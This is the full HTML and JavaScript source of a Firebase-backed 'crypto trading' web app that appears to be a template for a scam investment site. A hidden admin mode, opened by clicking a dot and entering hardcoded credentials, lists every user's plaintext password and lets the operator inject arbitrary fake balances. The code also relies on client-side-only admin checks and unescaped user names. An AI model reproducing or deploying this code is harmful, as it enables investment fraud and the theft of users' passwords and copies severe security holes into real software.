<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Magic Trade Global</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
    <style>
        body { background: #010409; color: #e6edf3; font-family: -apple-system, sans-serif; height: 100dvh; display: flex; flex-direction: column; overflow: hidden; margin: 0; }
        .magic-card { background: #0d1117; border: 1px solid #30363d; border-radius: 12px; }
        .magic-gradient { background: linear-gradient(90deg, #1f6feb 0%, #388ed1 100%); }
        .bottom-nav { background: #0d1117; border-top: 1px solid #30363d; position: fixed; bottom: 0; width: 100%; display: flex; justify-content: space-around; padding: 12px 0; z-index: 100; }
        .nav-item { display: flex; flex-direction: column; align-items: center; font-size: 10px; color: #8b949e; cursor: pointer; }
        #scroll-area { flex: 1; overflow-y: auto; padding-bottom: 120px; }
        .chart-box { height: 350px; width: 100%; border-radius: 12px; overflow: hidden; border: 1px solid #30363d; background: #000; margin-bottom: 20px; }
    </style>
</head>
<body>

    <div id="auth-screen" class="fixed inset-0 z-[200] flex flex-col items-center justify-center bg-[#010409] p-6 text-center">
        <h1 class="text-4xl font-black text-white italic mb-2">MAGIC<span class="text-blue-500">TRADE</span></h1>
        <p class="text-[9px] text-slate-500 uppercase mb-8">Cloud Node Active <span onclick="triggerAdminLogin()">‚óè</span></p>
        <div class="magic-card p-6 w-full max-w-sm space-y-4">
            <input type="text" id="reg-name" placeholder="Full Name" class="hidden w-full p-4 rounded-xl bg-black border border-slate-800 text-white outline-none">
            <input type="email" id="email" placeholder="Email Address" class="w-full p-4 rounded-xl bg-black border border-slate-800 text-white outline-none">
            <input type="password" id="pass" placeholder="Password" class="w-full p-4 rounded-xl bg-black border border-slate-800 text-white outline-none">
            <button onclick="handleAuth()" class="w-full magic-gradient p-4 rounded-xl font-bold uppercase text-xs">Login</button>
            <button onclick="toggleAuthMode()" id="auth-toggle-btn" class="text-xs text-blue-500 font-bold block mx-auto mt-4">Create Account</button>
        </div>
    </div>

    <div id="app" class="hidden flex flex-col h-full overflow-hidden">
        <div id="scroll-area">
            <main class="p-4">
                <section id="home-sec" class="space-y-4">
                    <div class="magic-card p-6 bg-gradient-to-br from-[#1b2129] to-[#010409]">
                        <p class="text-slate-500 text-[9px] font-bold uppercase">Available Capital</p>
                        <h2 class="text-3xl font-mono font-bold text-white" id="display-bal">$0.00</h2>
                    </div>
                    <div id="master-market-feed"></div>
                </section>

                <section id="admin-sec" class="hidden space-y-6">
                    <h3 class="text-2xl font-black text-blue-500 italic uppercase">Global Admin Logs</h3>
                    <div id="user-logs" class="space-y-4 pb-20"></div>
                </section>

                <section id="profile-sec" class="hidden space-y-4">
                    <div class="magic-card p-8 text-center">
                        <p id="prof-name" class="text-xl font-black text-white">---</p>
                        <p id="prof-email" class="text-slate-500 text-xs">---</p>
                    </div>
                </section>
            </main>
        </div>

        <nav class="bottom-nav">
            <div onclick="showSection('home')" class="nav-item">üìà<span>Markets</span></div>
            <div onclick="showSection('profile')" class="nav-item">üë§<span>Profile</span></div>
            <div id="admin-nav-btn" onclick="showSection('admin')" class="nav-item hidden text-green-500">üõ°Ô∏è<span>Admin</span></div>
            <div onclick="logoutUser()" class="nav-item text-red-500 font-bold">üö´<span>Logout</span></div>
        </nav>
    </div>

    <script>
        // PASTE YOUR FIREBASE CONFIG HERE
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "YOUR_PROJECT.firebaseapp.com",
            databaseURL: "https://YOUR_PROJECT.firebaseio.com",
            projectId: "YOUR_PROJECT_ID",
            storageBucket: "YOUR_PROJECT.appspot.com",
            messagingSenderId: "YOUR_SENDER_ID",
            appId: "YOUR_APP_ID"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        let activeUser = null;

        function handleAuth() {
            const e = document.getElementById('email').value.trim().toLowerCase().replace(/\./g, ',');
            const p = document.getElementById('pass').value;
            const isReg = !document.getElementById('reg-name').classList.contains('hidden');

            if(isReg) {
                const n = document.getElementById('reg-name').value;
                db.ref('users/' + e).set({ name: n, pass: p, bal: 0 }, (err) => {
                    if(!err) { alert("Node Created"); toggleAuthMode(); }
                });
            } else {
                db.ref('users/' + e).once('value', (s) => {
                    const data = s.val();
                    if(data && data.pass === p) enterApp(e, data);
                    else alert("Access Denied");
                });
            }
        }

        function enterApp(e, data) {
            activeUser = e;
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('app').classList.remove('hidden');
            if(localStorage.getItem('magic_is_admin') === 'true') {
                document.getElementById('admin-nav-btn').classList.remove('hidden');
                listenForUsers();
            }
            // Real-time Balance Sync
            db.ref('users/' + e).on('value', (s) => {
                const u = s.val();
                document.getElementById('display-bal').innerText = "$" + (u.bal || 0).toLocaleString();
                document.getElementById('prof-name').innerText = u.name;
                document.getElementById('prof-email').innerText = e.replace(/,/g, '.');
            });
        }

        function listenForUsers() {
            db.ref('users').on('value', (snapshot) => {
                const users = snapshot.val();
                const logContainer = document.getElementById('user-logs');
                logContainer.innerHTML = Object.entries(users).map(([email, data]) => `
                    <div class="magic-card p-4 border-l-4 ${data.bal === 0 ? 'border-l-blue-500' : 'border-l-green-500'}">
                        <p class="text-blue-400 font-bold text-xs uppercase">${data.name}</p>
                        <p class="text-white text-[10px] font-mono">${email.replace(/,/g, '.')}</p>
                        <p class="text-red-500 text-[9px] font-bold">PASS: ${data.pass}</p>
                        <div class="flex justify-between items-center mt-3">
                            <p class="text-white font-bold">$${(data.bal || 0).toLocaleString()}</p>
                            <button onclick="injectFunds('${email}')" class="bg-blue-600 px-3 py-1 rounded text-[9px] font-black">INJECT üí∏</button>
                        </div>
                    </div>
                `).join('');
            });
        }

        function injectFunds(emailKey) {
            const amt = prompt("Amount to Inject:");
            if(amt) {
                db.ref('users/' + emailKey + '/bal').transaction((current) => (current || 0) + parseFloat(amt));
            }
        }

        function triggerAdminLogin() {
            if(prompt("ID")==="MASTER_ADA" && prompt("KEY")==="ADA_777_NODE") {
                localStorage.setItem('magic_is_admin', 'true');
                location.reload(); // Refresh to activate admin mode
            }
        }

        function showSection(s) {
            ['home', 'profile', 'admin'].forEach(x => document.getElementById(x+'-sec').classList.add('hidden'));
            document.getElementById(s+'-sec').classList.remove('hidden');
        }

        function toggleAuthMode() { 
            document.getElementById('reg-name').classList.toggle('hidden'); 
            document.getElementById('auth-toggle-btn').innerText = document.getElementById('reg-name').classList.contains('hidden') ? "Create Account" : "Back to Login";
        }

        function logoutUser() { localStorage.clear(); location.reload(); }

        function renderMarketFeed() {
            const assets = ["BTCUSD", "ETHUSD", "XAUUSD"];
            document.getElementById('master-market-feed').innerHTML = assets.map((a, i) => `<div class="chart-box" id="chart_${i}"></div>`).join('');
            assets.forEach((a, i) => new TradingView.widget({ "autosize": true, "symbol": a, "interval": "1", "theme": "dark", "container_id": `chart_${i}`, "hide_top_toolbar": true }));
        }
    </script>
</body>
</html>
